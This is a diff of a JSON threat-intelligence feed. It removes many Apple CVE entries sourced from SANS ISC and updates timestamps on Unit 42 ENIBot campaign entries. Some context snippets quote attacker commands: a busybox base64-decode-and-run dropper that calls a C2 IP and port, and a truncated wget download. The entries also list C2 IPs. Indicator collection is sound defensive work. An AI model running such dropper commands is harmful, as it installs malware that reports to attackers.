-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t   \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64719:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-64721",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64721:  An app may be able to access sensitiv"
-    },
-    {
-      "value": "CVE-2026-64722",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64722:  Processing a 3D model may result in d"
-    },
-    {
-      "value": "CVE-2026-64723",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64723:  An app may be able to access sensitiv"
-    },
-    {
-      "value": "CVE-2026-64724",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64724:  An attacker on the local network may "
-    },
-    {
-      "value": "CVE-2026-64725",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64725:  An app may be able to cause a denial-"
-    },
-    {
-      "value": "CVE-2026-64726",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64726:  An attacker in physical proximity may"
-    },
-    {
-      "value": "CVE-2026-64732",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64732:  An attacker with physical access may "
-    },
-    {
-      "value": "CVE-2026-64734",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64734:  Processing a maliciously crafted cont"
-    },
-    {
-      "value": "CVE-2026-64735",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64735:  A remote attacker may be able to bypa"
-    },
-    {
-      "value": "CVE-2026-64738",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64738:  A malicious app may be able to break "
-    },
-    {
-      "value": "CVE-2026-64739",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64739:  An attacker may be able to cause unex"
-    },
-    {
-      "value": "CVE-2026-64740",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64740:  A malicious app may be able to break "
-    },
-    {
-      "value": "CVE-2026-64742",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64742:  An app may be able to access sensitiv"
-    },
-    {
-      "value": "CVE-2026-64743",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64743:  An app may be able to access sensitiv"
-    },
-    {
-      "value": "CVE-2026-64744",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64744:  An app may be able to disclose kernel"
-    },
-    {
-      "value": "CVE-2026-64746",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64746:  An app may be able to add contacts wi"
-    },
-    {
-      "value": "CVE-2026-64747",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64747:  An app may be able to execute arbitra"
-    },
-    {
-      "value": "CVE-2026-64749",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64749:  An app may be able to cause unexpecte"
-    },
-    {
-      "value": "CVE-2026-64755",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64755:  An app may be able to access sensitiv"
-    },
-    {
-      "value": "CVE-2026-64757",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64757:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-64760",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64760:  An app may be able to leak sensitive "
-    },
-    {
-      "value": "CVE-2026-64762",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64762:  An app may be able to cause unexpecte"
-    },
-    {
-      "value": "CVE-2026-64763",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64763:  Processing a maliciously crafted file"
-    },
-    {
-      "value": "CVE-2026-64764",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64764:  Processing a maliciously crafted file"
-    },
-    {
-      "value": "CVE-2026-64765",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64765:  Processing a maliciously crafted file"
-    },
-    {
-      "value": "CVE-2026-64768",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64768:  A remote attacker may cause an unexpe"
-    },
-    {
-      "value": "CVE-2026-64769",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64769:  A remote attacker may be able to caus"
-    },
-    {
-      "value": "CVE-2026-64771",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64771:  A remote attacker may be able to caus"
-    },
-    {
-      "value": "CVE-2026-64772",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64772:  A remote attacker may be able to caus"
-    },
-    {
-      "value": "CVE-2026-64774",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64774:  A remote attacker may be able to caus"
-    },
-    {
-      "value": "CVE-2026-64778",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64778:  Visiting a maliciously crafted websit"
-    },
-    {
-      "value": "CVE-2026-64779",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t x \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64779:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-64780",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t x \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64780:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-64781",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t x \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64781:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-64782",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t x \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64782:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-64784",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t x \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64784:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-64787",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t   \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64787:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-64788",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t   \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-64788:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-65329",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t   \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-65329:  An attacker in a privileged network p"
-    },
-    {
-      "value": "CVE-2026-65330",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t   \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-65330:  An app may be able to cause unexpecte"
-    },
-    {
-      "value": "CVE-2026-65331",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t   \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-65331:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-65334",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t   \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-65334:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-65338",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t   \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-65338:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-65339",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t   \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-65339:  An app may be able to leak sensitive "
-    },
-    {
-      "value": "CVE-2026-65340",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t   \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-65340:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-65341",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t   \r\n\t\t\t x \r\n\t\t\t   \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-65341:  Processing maliciously crafted web co"
-    },
-    {
-      "value": "CVE-2026-65343",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t x \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-65343:  A remote attacker may be able to caus"
-    },
-    {
-      "value": "CVE-2026-65346",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t   \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-65346:  Processing an image may lead to arbit"
-    },
-    {
-      "value": "CVE-2026-65347",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t   \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-65347:  Processing an image may lead to a den"
-    },
-    {
-      "value": "CVE-2026-65349",
-      "type": "cve",
-      "source_name": "SANS ISC",
-      "article_title": "Apple Patches iOS and macOS, (Mon, Aug 17th)",
-      "article_url": "https://isc.sans.edu/diary/rss/33254",
-      "article_date": "Mon, 17 Aug 2026 20:26:39 GMT",
-      "context": "\n\t\t\t x \r\n\t\t\t   \r\n\t\t\t x \r\n\t\t \r\n\t\t \r\n\t\t\t  CVE-2026-65349:  An app may be able to cause unexpecte"
-    },
-    {
       "value": "CVE-2025-3248",
       "type": "cve",
       "source_name": "Trend Micro",
@@ -5564,7 +4592,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-19T13:44:18.434072+00:00",
+      "article_date": "2026-08-19T14:34:51.734897+00:00",
       "context": "at ENIBot targets. \r\n\r\nIOCs:\r\nMalicious Hashes (Examples):\r\n13336d8e6fcda501cf62955c223ba4745cb46adf58f466ce6fa52f3b9d1d"
     },
     {
@@ -5573,7 +4601,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-19T13:44:18.434072+00:00",
+      "article_date": "2026-08-19T14:34:51.734897+00:00",
       "context": "ies from old OpenSSH versions including CVE-2023-28531(severity:9.8), CVE-2024-6387(severity:8"
     },
     {
@@ -5582,7 +4610,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-19T13:44:18.434072+00:00",
+      "article_date": "2026-08-19T14:34:51.734897+00:00",
       "context": "including CVE-2023-28531(severity:9.8), CVE-2024-6387(severity:8.1) and CVE-2024-41996 (sever"
     },
     {
@@ -5591,7 +4619,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-19T13:44:18.434072+00:00",
+      "article_date": "2026-08-19T14:34:51.734897+00:00",
       "context": "y:9.8), CVE-2024-6387(severity:8.1) and CVE-2024-41996 (severity:7.5). \r\n- These vulnerabiliti"
     },
     {
@@ -5600,7 +4628,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-19T13:44:18.434072+00:00",
+      "article_date": "2026-08-19T14:34:51.734897+00:00",
       "context": "d_scripts |busybox base64 -d>/tmp/sshd;busybox sh /tmp/sshd 216.167.26.154 1337 enibot2024\r\n- busybox wget -q http://216"
     },
     {
@@ -5609,7 +4637,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-19T13:44:18.434072+00:00",
+      "article_date": "2026-08-19T14:34:51.734897+00:00",
       "context": "5d5272587405611fd3de7b0d\r\n\r\nC2 IP:\r\n- July\r\n216.167.26.154\r\n192.204.41.160\r\n- June\r\n176.65.139.99\r\n176.65.139.7\r\n- May\r\n"
     },
     {
@@ -5618,7 +4646,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-19T13:44:18.434072+00:00",
+      "article_date": "2026-08-19T14:34:51.734897+00:00",
       "context": "\r\n\r\nC2 IP:\r\n- July\r\n216.167.26.154\r\n192.204.41.160\r\n- June\r\n176.65.139.99\r\n176.65.139.7\r\n- May\r\n176.65.139.11\r\n176.65.13"
     },
     {
@@ -5627,7 +4655,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-19T13:44:18.434072+00:00",
+      "article_date": "2026-08-19T14:34:51.734897+00:00",
       "context": "192.204.41.160\r\n- June\r\n176.65.139.99\r\n176.65.139.7\r\n- May\r\n176.65.139.11\r\n176.65.139.69\r\n176.65.139.59\r\n\r\nScanning IP ("
     },
     {
@@ -5636,7 +4664,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-19T13:44:18.434072+00:00",
+      "article_date": "2026-08-19T14:34:51.734897+00:00",
       "context": "\n- June\r\n176.65.139.99\r\n176.65.139.7\r\n- May\r\n176.65.139.11\r\n176.65.139.69\r\n176.65.139.59\r\n\r\nScanning IP (Examples):\r\n52."
     },
     {
@@ -5645,7 +4673,7 @@
       "source_name": "Unit 42 (GitHub)",
       "article_title": "2026-08-14-ENIBot-HuntBot-Campaign.txt",
       "article_url": "https://github.com/PaloAltoNetworks/Unit42-timely-threat-intel/blob/main/2026-08-14-ENIBot-HuntBot-Campaign.txt",
-      "article_date": "2026-08-19T13:44:18.434072+00:00",
+      "article_date": "2026-08-19T14:34:51.734897+00:00",
       "context": ".139.99\r\n176.65.139.7\r\n- May\r\n176.65.139.11\r\n176.65.139.69\r\n176.65.139.59\r\n\r\nScanning IP (Examples):\r\n52.190.182.226\r\n20"
     },
     {
